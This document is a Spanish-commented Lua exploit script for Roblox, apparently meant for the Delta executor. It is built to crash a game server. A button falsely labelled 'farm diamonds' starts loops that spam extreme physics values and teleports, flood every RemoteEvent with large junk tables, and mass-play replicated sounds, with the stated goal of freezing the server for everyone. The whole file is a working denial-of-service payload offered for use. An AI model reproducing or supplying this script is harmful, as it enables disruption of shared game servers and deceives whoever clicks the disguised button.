--[[
  MÉTODO: APOCALYPSE NET-BURNER (FE BYPASS)
  ADVERTENCIA: Congelamiento casi instantáneo de la conexión del servidor.
--]]

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

-- Asegurar que todo cargue bien en Delta
while not localPlayer do task.wait(0.1) localPlayer = Players.LocalPlayer end
local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
while not playerGui do task.wait(0.1) playerGui = localPlayer:FindFirstChildOfClass("PlayerGui") end

-- GUI Estilo Destructivo
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NuclearCrashGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local boton = Instance.new("TextButton")
boton.Size = UDim2.new(0, 250, 0, 70)
boton.Position = UDim2.new(0.5, -125, 0.2, 0)
boton.BackgroundColor3 = Color3.fromRGB(255, 69, 0)
boton.TextColor3 = Color3.fromRGB(0, 0, 0)
boton.TextSize = 16
boton.Font = Enum.Font.FredokaOne
boton.Text = "💎 FARMEAR DIAMANTES 💎"
boton.BorderSizePixel = 5
boton.Parent = screenGui

local CRASH_ACTIVADO = false

local function ataqueDestructivoMaximo()
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")
    
    -- Ajustamos las propiedades físicas de tu personaje para romper el cálculo del servidor
    for _, v in pairs(character:GetChildren()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
            -- Forzamos al servidor a procesar velocidades infinitas
            v.Velocity = Vector3.new(999999, 999999, 999999)
            v.RotVelocity = Vector3.new(999999, 999999, 999999)
        end
    end

    while CRASH_ACTIVADO do
        -- Súper Bucle Interno: Ejecuta 500 ataques por cada milésima de segundo
        for i = 1, 500 do
            -- ATAQUE 1: Inundación de replicación de coordenadas (Físicas Corruptas)
            -- Cambiamos la posición a extremos masivos para que el servidor intente actualizar a los demás clientes y colapse el ping.
            hrp.CFrame = CFrame.new(math.random(-999999, 999999), math.random(5000, 999999), math.random(-999999, 999999))
            
            -- ATAQUE 2: Explotar el canal de audio del servidor (Sound Replication Spam)
            -- Buscamos cualquier Remote o sonido que se replique para obligar al server a reproducirlo mil veces por frame.
            for _, objeto in pairs(game:GetDescendants()) do
                if objeto:IsA("RemoteEvent") then
                    -- Le enviamos tablas gigantescas de datos corruptos
                    objeto:FireServer(table.create(500, "🔥NUKED_BY_DELTA🔥"))
                elseif objeto:IsA("Sound") then
                    -- Si el juego tiene sonidos replicados, los forzamos a reproducirse en masa
                    objeto:Play()
                end
            end
        end
        -- El mínimo respiro absoluto para enviar la máxima cantidad de paquetes permitida por el internet del cel
        task.wait(0.0001) 
    end
end

-- Activación por click
boton.MouseButton1Click:Connect(function()
    if not CRASH_ACTIVADO then
        CRASH_ACTIVADO = true
        boton.Text = "💥 SERVIDOR CONGELADO 💥"
        boton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        boton.TextColor3 = Color3.fromRGB(255, 0, 0)
        
        task.spawn(ataqueDestructivoMaximo)
    else
        CRASH_ACTIVADO = false
        boton.Text = "☢️ FARMEANDO DIAMANTES ☢️"
        boton.BackgroundColor3 = Color3.fromRGB(255, 69, 0)
        boton.TextColor3 = Color3.fromRGB(0, 0, 0)
        
        -- Resetear el personaje si sobrevive
        local char = localPlayer.Character
        if char then char:BreakJoints() end
    end
end)

print("¡Payload Ultra Potente listo para ejecución!")
